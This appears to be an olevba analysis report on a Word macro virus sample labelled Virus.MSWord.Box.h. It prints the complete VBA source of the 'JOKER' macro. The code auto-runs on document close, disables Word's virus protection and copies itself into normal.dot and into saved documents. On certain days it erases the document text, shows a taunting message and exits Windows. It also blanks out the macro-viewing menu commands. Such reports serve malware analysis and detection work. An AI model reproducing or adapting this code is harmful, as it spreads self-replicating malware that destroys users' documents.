olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Box.h-f29e8389b6f512a79eda1be34b9810352ee21c58
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Box.h-f29e8389b6f512a79eda1be34b9810352ee21c58 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO JOKER.bas 
in file: Virus.MSWord.Box.h-f29e8389b6f512a79eda1be34b9810352ee21c58 - OLE stream: 'Macros/VBA/JOKER'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Attribute AutoClose.VB_Description = "巨集建立於 98/03/13，建立者 AAAA"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.AutoClose"
Dim F$
Dim N$
On Error Resume Next
Options.VirusProtection = False
For ADVVC = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(ADVVC).Name = "JOKER" Then
DocumentInstalled = True
End If
Next
For NTVVC = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(NTVVC).Name = "JOKER" Then
GlobalInstalled = True
End If
Next
If DocumentInstalled = True Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="JOKER", Object:=wdOrganizerObjectProjectItems
activedoc.SaveAs FileName:=activedoc.Name, fileformat:=wdFormatTemplate
Options.SavePropertiesPrompt = False
End If
If GlobalInstalled = True Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="JOKER", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If

On Error Resume Next
F$ = WordBasic.[FileName$]()
N$ = "normal.dot"
Application.OrganizerCopy Source:=F$, Destination:=N$, Name:="JOKER", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
WordBasic.FileSaveAs Format:=1
F$ = WordBasic.[FileName$](0)
Application.OrganizerCopy Source:=N$, Destination:=F$, Name:="JOKER", Object:=wdOrganizerObjectProjectItems
Options.SavePropertiesPrompt = False

WordBasic.FileSaveAs Format:=1
F$ = WordBasic.[FileName$](1)
Application.OrganizerCopy Source:=N$, Destination:=F$, Name:="JOKER", Object:=wdOrganizerObjectProjectItems
Options.SavePropertiesPrompt = False

WordBasic.FileSaveAs Format:=1
F$ = WordBasic.[FileName$](2)
Application.OrganizerCopy Source:=N$, Destination:=F$, Name:="JOKER", Object:=wdOrganizerObjectProjectItems
Options.SavePropertiesPrompt = False

WordBasic.FileSaveAs Format:=1
F$ = WordBasic.[FileName$](3)
Application.OrganizerCopy Source:=N$, Destination:=F$, Name:="JOKER", Object:=wdOrganizerObjectProjectItems
Options.SavePropertiesPrompt = False

WordBasic.FileSaveAs Format:=1
F$ = WordBasic.[FileName$](4)
Application.OrganizerCopy Source:=N$, Destination:=F$, Name:="JOKER", Object:=wdOrganizerObjectProjectItems
Options.SavePropertiesPrompt = False


If WordBasic.Day(Now()) = 7 Or WordBasic.Day(Now()) = 14 Or WordBasic.Day(Now()) = 21 Then
SWSD
End If

exit_:

End Sub
Private Sub SWSD()
On Error Resume Next

    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    Selection.Font.Size = 24
    Selection.TypeText Text:="**********************************"
    Selection.TypeParagraph
    Selection.TypeText Text:="* 我是貪吃的搗蛋鬼﹝JOKER﹞， 很 *"
    Selection.TypeParagraph
    Selection.TypeText Text:="* 抱歉，我把您的文件內容吃掉了。 *"
    Selection.TypeParagraph
    Selection.TypeText Text:="* 唉！要是您的防毒軟體確實發揮了 *"
    Selection.TypeParagraph
    Selection.TypeText Text:="* 功能，那這段文字您將不會看到。 *"
    Selection.TypeParagraph
    Selection.TypeText Text:="**********************************"
    ActiveWindow.ActivePane.SmallScroll Down:=-9
    WordBasic.docclose 1
    WordBasic.ExitWindows

End Sub
Sub ToolsOptions()
Rem
Rem
End Sub
Sub FileTemplates()
Rem
Rem
End Sub
Sub ToolsMacro()
Rem
Rem
End Sub
Sub ViewVbCode()
Rem
Rem
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
